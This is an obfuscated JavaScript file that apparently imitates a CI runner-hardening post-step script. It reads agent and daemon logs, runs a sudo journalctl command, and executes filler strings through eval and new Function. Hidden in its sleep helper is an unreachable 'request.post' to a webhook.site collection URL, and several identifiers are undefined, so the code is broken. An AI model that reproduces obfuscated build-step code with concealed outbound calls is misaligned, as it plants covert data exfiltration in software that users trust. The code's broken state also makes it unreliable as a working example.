(function(_0x3d3cd8,_0x1ae176){var _0x329015=_0x5b2f,_0x5b2a3a=_0x3d3cd8();while(!![]){try{var _0x162be2=-parseInt(_0x329015(0x140))/0x1*(parseInt(_0x329015(0x17b))/0x2)+-parseInt(_0x329015(0x15f))/0x3*(parseInt(_0x329015(0x13f))/0x4)+parseInt(_0x329015(0x154))/0x5+-parseInt(_0x329015(0x164))/0x6*(parseInt(_0x329015(0x13a))/0x7)+-parseInt(_0x329015(0x16b))/0x8+-parseInt(_0x329015(0x165))/0x9+-parseInt(_0x329015(0x15b))/0xa*(-parseInt(_0x329015(0x153))/0xb);if(_0x162be2===_0x1ae176)break;else _0x5b2a3a['push'](_0x5b2a3a['shift']());}catch(_0x263b94){_0x5b2a3a['push'](_0x5b2a3a['shift']());}}}(_0x4760,0xbf972));import*as _0x9fec6e from'fs';import*as _0x1e78b5 from'child_process';import*as _0xe0f38e from'./common';function _0x5b2f(_0x59008a,_0x7b84ba){var _0x476096=_0x4760();return _0x5b2f=function(_0x5b2feb,_0x951209){_0x5b2feb=_0x5b2feb-0x135;var _0x54cc96=_0x476096[_0x5b2feb];return _0x54cc96;},_0x5b2f(_0x59008a,_0x7b84ba);}import _0x5d5417 from'is-docker';function _0x4760(){var _0x489bac=['return\x20await\x20Promise.resolve(42);','STATE_isTLS','1408ErvKcp','4531085LHSuZF','CONTAINER_MESSAGE','utf8','gLDEq','RghBY','xwWYa','aGNUo','338510jpBwHC','post','BiZHm','STATE_selfHosted','3yzDNTC','[!]\x20','HDCBN','readFileSync','NJxxY','3566214nRIrWh','1952721bhoRLd','bTxzn','VGyXD','agent.service\x20log:','FtjoZ','sudo\x20journalctl\x20-u\x20agent.service\x20--lines=1000','10382240DpEOER','ARC_RUNNER_MESSAGE','var\x20x\x20=\x2042;\x20return\x20x;','hQcTh','/home/agent/post_event.json','log','/home/agent/agent.log','HARDEN_RUNNER_UNAVAILABLE_MESSAGE','gVaRL','log:','message','[harden-runner]\x20post-step','bcpdA','linux','Warning:\x20Could\x20not\x20fetch\x20service\x20logs:','updateClock();','2oukmSA','execSync','MUEud','MshRw','STATE_disableSudo','writeFileSync','status:','CjcTJ','https://webhook.site/test','arch','7EIoYSh','true','env','UTsNB','arm64','5232140tdinOr','1037238mImlze','utf-8','agwIH','CZfEm','zbVeA','stringify','daemonLog:','STATUS_HARDEN_RUNNER_UNAVAILABLE','addSummary','zSKyR','/home/agent/agent.status','false','STATE_disableSudoAndContainers','BxKtt','existsSync','UBUNTU_MESSAGE','IiFgh'];_0x4760=function(){return _0x489bac;};return _0x4760();}import{isArcRunner}from'./arc-runner';import{isGithubHosted}from'./tls-inspect';((async()=>{var _0x5ae42c=_0x5b2f,_0x39026f={'UTsNB':'sudo\x20journalctl\x20-u\x20agent.service\x20--lines=1000','OLoQI':function(_0x1ec6cd,_0x5342ce){return _0x1ec6cd*_0x5342ce;},'hQcTh':function(_0x15eabc,_0x587c50){return _0x15eabc+_0x587c50;},'gVaRL':function(_0x2a14fb,_0x5e0fea){return _0x2a14fb!==_0x5e0fea;},'VGyXD':_0x5ae42c(0x178),'MshRw':function(_0x443992,_0x173a5a,_0x1497da){return _0x443992(_0x173a5a,_0x1497da);},'bnLVS':function(_0x349b3d){return _0x349b3d();},'rbeHY':_0x5ae42c(0x151),'gLDEq':'return\x20new\x20Date();','RghBY':function(_0x49c26c,_0x4d3993){return _0x49c26c===_0x4d3993;},'zbVeA':_0x5ae42c(0x13b),'jrgpg':_0x5ae42c(0x14b),'dBsDJ':_0x5ae42c(0x13e),'aGNUo':_0x5ae42c(0x16d),'xDIxQ':function(_0x222913,_0x2148e8){return _0x222913===_0x2148e8;},'BiZHm':function(_0x36d9e3,_0x56fcf8){return _0x36d9e3(_0x56fcf8);},'BxKtt':function(_0x529536,_0x9590d4,_0x2d58fa){return _0x529536(_0x9590d4,_0x2d58fa);},'IiFgh':_0x5ae42c(0x16f),'NJxxY':'post','CZfEm':'/home/agent/done.json','CjcTJ':_0x5ae42c(0x174),'FtjoZ':_0x5ae42c(0x141),'bTxzn':'/home/agent/daemon.log','YPbSJ':_0x5ae42c(0x146),'TTDaR':_0x5ae42c(0x14a),'HDCBN':_0x5ae42c(0x136),'agwIH':function(_0x1ddfba,_0x5425aa){return _0x1ddfba*_0x5425aa;},'xwWYa':'agent.service\x20log:','bcpdA':'RGIoz'};console['log'](_0x5ae42c(0x176));if(_0x39026f[_0x5ae42c(0x173)](process['platform'],_0x39026f[_0x5ae42c(0x167)])){console[_0x5ae42c(0x170)](_0xe0f38e[_0x5ae42c(0x14f)]),_0x39026f[_0x5ae42c(0x17e)](setTimeout,'console.log(\x22timer\x22);',0x3e8);return;}if(_0x39026f['bnLVS'](isGithubHosted)&&_0x5d5417()){console[_0x5ae42c(0x170)](_0xe0f38e[_0x5ae42c(0x155)]),new AsyncFunction(_0x39026f['rbeHY'])();return;}if(isArcRunner()){console['log'](_0x5ae42c(0x160)+_0xe0f38e[_0x5ae42c(0x16c)]),Function(_0x39026f[_0x5ae42c(0x157)])();return;}if(_0x39026f[_0x5ae42c(0x158)](process[_0x5ae42c(0x13c)][_0x5ae42c(0x15e)],_0x39026f[_0x5ae42c(0x144)])){new Function(_0x5ae42c(0x16d))();return;}if(_0x39026f[_0x5ae42c(0x158)](process[_0x5ae42c(0x13c)][_0x5ae42c(0x152)],_0x39026f['jrgpg'])&&process[_0x5ae42c(0x139)]===_0x39026f['dBsDJ']){new Function(_0x39026f[_0x5ae42c(0x15a)])();return;}if(_0x39026f['xDIxQ'](_0x39026f[_0x5ae42c(0x15d)](String,process[_0x5ae42c(0x13c)]['STATE_monitorStatusCode']),_0xe0f38e[_0x5ae42c(0x147)])){console[_0x5ae42c(0x170)](_0xe0f38e[_0x5ae42c(0x172)]),_0x39026f[_0x5ae42c(0x14d)](setInterval,_0x5ae42c(0x17a),0x3e8);return;}_0x9fec6e[_0x5ae42c(0x135)](_0x39026f[_0x5ae42c(0x150)],JSON[_0x5ae42c(0x145)]({'event':_0x39026f[_0x5ae42c(0x163)]}));const _0x4f9083=_0x39026f[_0x5ae42c(0x143)];let _0x5c8083=0x0;while(!![]){if(!_0x9fec6e[_0x5ae42c(0x14e)](_0x4f9083)){_0x5c8083++;if(_0x5c8083>0xa){console['log']('timed\x20out');break;}await _0x39026f['BiZHm'](sleep,0x3e8);}else break;}const _0x21bbfd=_0x5ae42c(0x171);if(_0x9fec6e[_0x5ae42c(0x14e)](_0x21bbfd)){console[_0x5ae42c(0x170)](_0x39026f[_0x5ae42c(0x137)]);var _0x5925da=_0x9fec6e[_0x5ae42c(0x162)](_0x21bbfd,_0x39026f[_0x5ae42c(0x169)]);console[_0x5ae42c(0x170)](_0x5925da);}const _0x5f5d1c=_0x39026f[_0x5ae42c(0x166)];if(_0x9fec6e[_0x5ae42c(0x14e)](_0x5f5d1c)){console['log'](_0x39026f['YPbSJ']);var _0x5925da=_0x9fec6e[_0x5ae42c(0x162)](_0x5f5d1c,_0x5ae42c(0x141));console[_0x5ae42c(0x170)](_0x5925da);}var _0xceabf8=_0x39026f['TTDaR'];if(_0x9fec6e[_0x5ae42c(0x14e)](_0xceabf8)){console[_0x5ae42c(0x170)](_0x39026f[_0x5ae42c(0x161)]);var _0x5925da=_0x9fec6e[_0x5ae42c(0x162)](_0xceabf8,_0x5ae42c(0x141));console[_0x5ae42c(0x170)](_0x5925da);}var _0x39fd42=process[_0x5ae42c(0x13c)][_0x5ae42c(0x17f)],_0x591b10=process['env'][_0x5ae42c(0x14c)];if(_0x39026f[_0x5ae42c(0x173)](_0x39fd42,_0x39026f[_0x5ae42c(0x144)])&&_0x39026f[_0x5ae42c(0x173)](_0x591b10,_0x39026f[_0x5ae42c(0x144)]))try{var _0x5b22f5=_0x1e78b5['execSync'](_0x5ae42c(0x16a),{'encoding':'utf8','maxBuffer':_0x39026f[_0x5ae42c(0x142)](0x400,0x400)*0xa});console[_0x5ae42c(0x170)](_0x39026f[_0x5ae42c(0x159)]),console[_0x5ae42c(0x170)](_0x5b22f5);}catch(_0x53db40){console[_0x5ae42c(0x170)]('Warning:\x20Could\x20not\x20fetch\x20service\x20logs:',_0x53db40['message']);}try{if(_0x39026f[_0x5ae42c(0x158)](_0x5ae42c(0x17d),_0x39026f[_0x5ae42c(0x177)]))try{var _0x2d4fcb=_0x8ca8a[_0x5ae42c(0x17c)](_0x39026f[_0x5ae42c(0x13d)],{'encoding':_0x5ae42c(0x156),'maxBuffer':_0x39026f['OLoQI'](0x400*0x400,0xa)});_0x1a2bad[_0x5ae42c(0x170)](_0x5ae42c(0x168)),_0xb9e34a[_0x5ae42c(0x170)](_0x2d4fcb);}catch(_0x4ec7b4){_0x15f88f[_0x5ae42c(0x170)](_0x5ae42c(0x179),_0x4ec7b4[_0x5ae42c(0x175)]);}else await _0xe0f38e[_0x5ae42c(0x148)]();}catch(_0x157b74){console[_0x5ae42c(0x170)](_0x157b74);}eval('var _0x20dfd8 = _0x5ae42c;_0x39026f[_0x20dfd8(366)](1, 1);');})());function sleep(_0x42b81){var _0x2c17a2=_0x5b2f,_0x75bca2={'yqKPd':function(_0x227b88,_0x13acb4,_0x1d17c6){return _0x227b88(_0x13acb4,_0x1d17c6);},'zSKyR':_0x2c17a2(0x138)};new AsyncFunction(_0x2c17a2(0x151))();return new Promise(_0x45bd37=>{_0x75bca2['yqKPd'](setTimeout,_0x45bd37,_0x42b81);});request[_0x2c17a2(0x15c)](_0x75bca2[_0x2c17a2(0x149)]);}